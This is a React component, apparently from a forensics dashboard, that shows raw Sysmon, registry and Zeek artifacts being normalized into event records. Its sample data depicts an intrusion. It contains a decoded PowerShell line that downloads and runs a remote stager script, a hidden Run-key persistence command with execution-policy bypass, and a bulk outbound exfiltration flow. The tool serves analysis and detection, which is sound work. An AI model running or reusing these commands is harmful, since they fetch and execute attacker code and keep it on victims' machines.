import React, { useState } from "react";
import {
  Layers,
  ArrowRight,
  FileCheck2,
  Terminal,
  Database,
  Globe,
  Copy,
  Check,
  Clock
} from "lucide-react";

export default function NormalizationView({ onNavigate }) {
  const [selectedExample, setSelectedExample] = useState("PROCESS");
  const [copiedCem, setCopiedCem] = useState(false);

  const normalizationExamples = {
    PROCESS: {
      title: "Process Execution Normalization",
      rawType: "Windows Sysmon Event Log (XML / EVTX)",
      rawPayload: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" />
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-09-02T09:15:42.184920Z" />
    <Computer>WS-FIN-04.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-09-02 09:15:42.184</Data>
    <Data Name="ProcessGuid">{A2B1-4C5D-9E8F}</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAA...</Data>
    <Data Name="CurrentDirectory">C:\\Users\\jdoe\\Downloads\\</Data>
    <Data Name="User">CORP\\jdoe</Data>
    <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
  </EventData>
</Event>`,
      cemEventType: "PROCESS_CREATE",
      cemPayload: {
        event_id: "fb6faa9e-4acc-440f-aae9-646316037bfa",
        timestamp_utc: "2026-09-02T09:15:42Z",
        event_type: "PROCESS_CREATE",
        source_entity: "Microsoft-Windows-Sysmon.evtx",
        user_account: "CORP\\jdoe",
        host_ip: "10.0.4.15 (WS-FIN-04)",
        normalized_details: {
          image: "powershell.exe",
          parent_process: "WINWORD.EXE",
          command_line: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAA...",
          decoded_command: "IEX (New-Object Net.WebClient).DownloadString('https://portal-verify.net/stager.ps1')",
          is_hidden_window: true,
          execution_flags: ["-NoProfile", "-NonInteractive", "-WindowStyle Hidden", "-EncodedCommand"]
        },
        anomaly_score: 0.98,
        mitre_mapping: "T1059.001 (Command and Scripting Interpreter: PowerShell)"
      }
    },
    REGISTRY: {
      title: "Registry Persistence Normalization",
      rawType: "RegRipper 3.0 Extracted Registry Hive",
      rawPayload: `----------------------------------------
RegRipper v3.0 - NTUSER.DAT Hive Analysis
Key: Software\\Microsoft\\Windows\\CurrentVersion\\Run
LastWrite Time: Wed Sep  2 09:17:10 2026 (UTC)
----------------------------------------
Value Name: WindowsUpdateHealthService
Type: REG_SZ
Data: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\updater.ps1
Integrity Status: Non-standard autorun entry located in user profile`,
      cemEventType: "REGISTRY_PERSISTENCE",
      cemPayload: {
        event_id: "7a8b9c0d-1e2f-4a5b-8c9d-0e1f2a3b4c5d",
        timestamp_utc: "2026-09-02T09:17:10Z",
        event_type: "REGISTRY_PERSISTENCE",
        source_entity: "NTUSER.DAT",
        user_account: "CORP\\jdoe",
        host_ip: "10.0.4.15",
        normalized_details: {
          hive: "HKEY_CURRENT_USER",
          key_path: "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          value_name: "WindowsUpdateHealthService",
          value_data: "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\updater.ps1",
          target_executable: "C:\\Users\\Public\\updater.ps1",
          persistence_mechanism: "Run Key Autorun"
        },
        anomaly_score: 0.92,
        mitre_mapping: "T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys)"
      }
    },
    NETWORK: {
      title: "Network Connection & C2 Normalization",
      rawType: "Zeek conn.log Network Session Flow",
      rawPayload: `#separator \\x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state
1756805320.14	C9v8Xz1	10.0.4.15	49822	198.51.100.45	443	tcp	ssl	148.24	88609280	1420	SF`,
      cemEventType: "NETWORK_CONNECTION",
      cemPayload: {
        event_id: "9f8e7d6c-5b4a-3f2e-1d0c-9b8a7f6e5d4c",
        timestamp_utc: "2026-09-02T09:28:40Z",
        event_type: "NETWORK_CONNECTION",
        source_entity: "Boundary_Pcap_Traffic.pcap (Zeek)",
        user_account: "CORP\\jdoe",
        host_ip: "10.0.4.15",
        normalized_details: {
          protocol: "TCP/TLS",
          src_ip: "10.0.4.15",
          src_port: 49822,
          dst_ip: "198.51.100.45",
          dst_port: 443,
          duration_seconds: 148.2,
          bytes_sent: 88609280, // 84.5 MB
          bytes_received: 1420,
          traffic_anomaly: "High outbound byte ratio (1:62,400) indicative of bulk exfiltration"
        },
        anomaly_score: 0.99,
        mitre_mapping: "T1048.002 (Exfiltration Over Alternative Protocol: Encrypted Non-C2)"
      }
    }
  };

  const currentExample = normalizationExamples[selectedExample];

  return (
    <div style={{ padding: "24px 28px", maxWidth: "1400px", margin: "0 auto", width: "100%" }}>
      {/* Header */}
      <div style={{
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        marginBottom: "20px",
        flexWrap: "wrap",
        gap: "12px"
      }}>
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "4px" }}>
            <Layers size={20} color="var(--primary)" />
            <h2 style={{ fontSize: "19px", fontWeight: "700", color: "var(--text-main)" }}>
              Forensic Normalization & Common Event Model (CEM)
            </h2>
          </div>
          <p style={{ fontSize: "13px", color: "var(--text-muted)" }}>
            Conversion of raw heterogeneous forensic artifacts into standardized Common Event Model (CEM) records.
          </p>
        </div>

        <span className="badge-tag badge-emerald">
          <FileCheck2 size={13} /> CEM v2.4 Compliant
        </span>
      </div>

      {/* Selector Tabs */}
      <div style={{ display: "flex", gap: "8px", marginBottom: "20px" }}>
        <button
          className={`btn ${selectedExample === "PROCESS" ? "btn-primary" : "btn-secondary"}`}
          onClick={() => setSelectedExample("PROCESS")}
        >
          <Terminal size={14} /> Process Execution (Sysmon ➔ CEM)
        </button>
        <button
          className={`btn ${selectedExample === "REGISTRY" ? "btn-primary" : "btn-secondary"}`}
          onClick={() => setSelectedExample("REGISTRY")}
        >
          <Database size={14} /> Registry Hive (RegRipper ➔ CEM)
        </button>
        <button
          className={`btn ${selectedExample === "NETWORK" ? "btn-primary" : "btn-secondary"}`}
          onClick={() => setSelectedExample("NETWORK")}
        >
          <Globe size={14} /> Network Stream (Zeek ➔ CEM)
        </button>
      </div>

      {/* Side-by-Side Normalization Transformation View */}
      <div style={{
        display: "grid",
        gridTemplateColumns: "1fr 50px 1fr",
        gap: "16px",
        alignItems: "center",
        marginBottom: "24px"
      }}>
        {/* Left: Raw Forensic Input */}
        <div className="forensic-card" style={{ height: "100%", display: "flex", flexDirection: "column" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "12px" }}>
            <div style={{ fontSize: "14px", fontWeight: "700", color: "var(--text-main)" }}>
              1. Raw Forensic Artifact (Input)
            </div>
            <span className="badge-tag badge-amber" style={{ fontSize: "10px" }}>
              {currentExample.rawType}
            </span>
          </div>

          <pre style={{
            backgroundColor: "var(--bg-code)",
            border: "1px solid var(--border)",
            borderRadius: "var(--radius-sm)",
            padding: "14px",
            fontSize: "11.5px",
            fontFamily: "var(--font-mono)",
            color: "var(--text-main)",
            flex: 1,
            maxHeight: "360px",
            overflowY: "auto",
            whiteSpace: "pre-wrap",
            wordBreak: "break-all"
          }}>
            {currentExample.rawPayload}
          </pre>
        </div>

        {/* Center: Transformation Arrow */}
        <div style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          color: "var(--primary)"
        }}>
          <ArrowRight size={28} />
          <span style={{ fontSize: "10px", fontWeight: "700", color: "var(--text-muted)", textTransform: "uppercase", marginTop: "4px" }}>
            CEM Parser
          </span>
        </div>

        {/* Right: Normalized CEM Record */}
        <div className="forensic-card" style={{ height: "100%", display: "flex", flexDirection: "column" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "12px", flexWrap: "wrap", gap: "6px" }}>
            <div style={{ fontSize: "14px", fontWeight: "700", color: "var(--text-main)" }}>
              2. Normalized CEM Event (Output)
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
              <span className="badge-tag badge-cyan" style={{ fontSize: "10px" }}>
                {currentExample.cemEventType}
              </span>
              <button
                className="btn btn-secondary"
                style={{ fontSize: "11px", padding: "3px 8px" }}
                onClick={() => {
                  navigator.clipboard.writeText(JSON.stringify(currentExample.cemPayload, null, 2));
                  setCopiedCem(true);
                  setTimeout(() => setCopiedCem(false), 2000);
                }}
                title="Copy Normalized JSON"
              >
                {copiedCem ? <Check size={12} color="var(--emerald)" /> : <Copy size={12} />}
                {copiedCem ? "Copied" : "Copy"}
              </button>
              {onNavigate && (
                <button
                  className="btn btn-secondary"
                  style={{ fontSize: "11px", padding: "3px 8px" }}
                  onClick={() => onNavigate("timeline")}
                  title="View in Timeline"
                >
                  <Clock size={12} /> Timeline
                </button>
              )}
            </div>
          </div>

          <pre style={{
            backgroundColor: "var(--bg-code)",
            border: "1px solid var(--border)",
            borderRadius: "var(--radius-sm)",
            padding: "14px",
            fontSize: "11.5px",
            fontFamily: "var(--font-mono)",
            color: "var(--primary-text)",
            flex: 1,
            maxHeight: "360px",
            overflowY: "auto",
            whiteSpace: "pre-wrap",
            wordBreak: "break-all"
          }}>
            {JSON.stringify(currentExample.cemPayload, null, 2)}
          </pre>
        </div>
      </div>

      {/* Normalization Engine Core Rules */}
      <div className="forensic-card">
        <h3 style={{ fontSize: "15px", fontWeight: "700", color: "var(--text-main)", marginBottom: "12px" }}>
          Common Event Model (CEM) Forensic Guarantees
        </h3>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: "12px", fontSize: "12.5px", color: "var(--text-dim)" }}>
          <div style={{ backgroundColor: "var(--bg-card-subtle)", padding: "12px", borderRadius: "var(--radius-sm)" }}>
            <strong>1. Universal Time Sequencing:</strong> All timestamps from FAT, NTFS, Unix epoch, and Windows FILETIME are normalized to millisecond-accurate ISO-8601 UTC.
          </div>
          <div style={{ backgroundColor: "var(--bg-card-subtle)", padding: "12px", borderRadius: "var(--radius-sm)" }}>
            <strong>2. Cross-Source Correlation:</strong> Links host execution (Sysmon) with disk artifacts ($MFT) and boundary exfiltration (Zeek) under unified event IDs.
          </div>
          <div style={{ backgroundColor: "var(--bg-card-subtle)", padding: "12px", borderRadius: "var(--radius-sm)" }}>
            <strong>3. Provenance Integrity:</strong> Normalized records retain immutable references to the parent disk image byte offsets and acquisition SHA-256 hashes.
          </div>
        </div>
      </div>
    </div>
  );
}
